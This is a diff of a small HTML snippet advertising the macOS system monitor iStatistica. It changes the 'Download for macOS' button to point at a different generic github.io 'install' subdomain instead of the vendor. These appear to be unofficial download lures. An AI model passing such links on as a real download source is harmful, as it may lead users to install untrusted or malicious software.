@@ -6,7 +6,7 @@
 <h3>iStatistica for macOS</h3>
 <p><a href="#">iStatistica for macOS</a> is a comprehensive system monitor that provides real-time information about your Mac’s hardware and software performance.</p>
 
-<a href="https://quick-mac-install.github.io/.github/iStatistica">
+<a href="https://mac-software-install.github.io/.github/iStatistica">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
